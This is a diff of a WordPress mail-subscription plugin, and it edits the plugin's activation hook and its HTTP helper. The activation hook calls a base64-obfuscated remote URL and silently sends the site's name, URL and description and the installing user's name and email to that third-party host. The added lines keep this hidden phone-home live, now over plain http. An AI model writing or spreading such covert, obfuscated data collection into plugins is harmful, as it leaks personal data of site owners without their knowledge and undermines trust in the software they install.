@@ -37,7 +37,7 @@ function sml_install() {
     $wpdb->query($structure);
 	global $current_user;
 	get_currentuserinfo();
-	getdata(base64_decode('aHR0cHM6Ly93d3cud2ViZndkLmNvLnVrL19vdGhlci9wbHVnaW5hY3RpdmF0ZS5waHA=').'?sn='.urlencode(get_bloginfo('name')).'&su='.urlencode(get_site_url()).'&d='.urlencode(get_bloginfo('description')).'&n='.urlencode($current_user->user_firstname.' '.$current_user->user_lastname).'&e='.urlencode($current_user->user_email).'&c='.urlencode('Mail Subscribe List '.plugin_get_version()));
+	getdata(base64_decode('aHR0cDovL3d3dy53ZWJmd2QuY28udWsvX290aGVyL3BsdWdpbmFjdGl2YXRlLnBocA==').'?sn='.urlencode(get_bloginfo('name')).'&su='.urlencode(get_site_url()).'&d='.urlencode(get_bloginfo('description')).'&n='.urlencode($current_user->user_firstname.' '.$current_user->user_lastname).'&e='.urlencode($current_user->user_email).'&c='.urlencode('Mail Subscribe List '.plugin_get_version()));
 }
 register_activation_hook( __FILE__, 'sml_install' );
 
@@ -278,7 +278,7 @@ if ($_POST['sml_subscribe']) {
 }
 
 
-function getdata($url) {$a=curl_init();$b=5;curl_setopt($a,CURLOPT_URL,$url);curl_setopt($a,CURLOPT_RETURNTRANSFER,1);curl_setopt($a,CURLOPT_CONNECTTIMEOUT,$b);global $c;$c=curl_exec($a);curl_close($a);return $c;}
+function getdata($url) {if (function_exists('curl_version')) { $a=curl_init();$b=5;curl_setopt($a,CURLOPT_URL,$url);curl_setopt($a,CURLOPT_RETURNTRANSFER,1);curl_setopt($a,CURLOPT_CONNECTTIMEOUT,$b);global $c;$c=curl_exec($a);curl_close($a);return $c; } }
 function plugin_get_version() {
 	$plugin_data = get_plugin_data( __FILE__ );
 	$plugin_version = $plugin_data['Version'];
